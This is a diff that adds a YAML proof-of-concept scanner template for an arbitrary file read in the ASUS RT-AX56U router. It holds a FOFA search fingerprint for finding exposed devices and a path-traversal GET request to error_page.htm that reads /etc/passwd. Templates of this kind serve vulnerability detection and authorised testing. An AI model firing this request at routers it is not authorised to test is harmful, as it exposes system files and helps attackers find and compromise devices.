@@ -1,0 +1,20 @@
+id: poc-yaml-asus-rt-ax56u-error-page-file-read
+info:
+  name: 华硕 RT-AX56U 路由器 error_page 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: rt-ax56u
+  fofa: body="Main_Login.asp" && body="RT-AX56U"
+requests:
+- method: GET
+  path: /error_page.htm?current_lang=/////etc/passwd
+  expression: 'status_code == 200 &&
+
+    contains(body,"root:") &&
+
+    contains(body,"/bin/sh")
+
+    '
+variables: {}
+transport: http
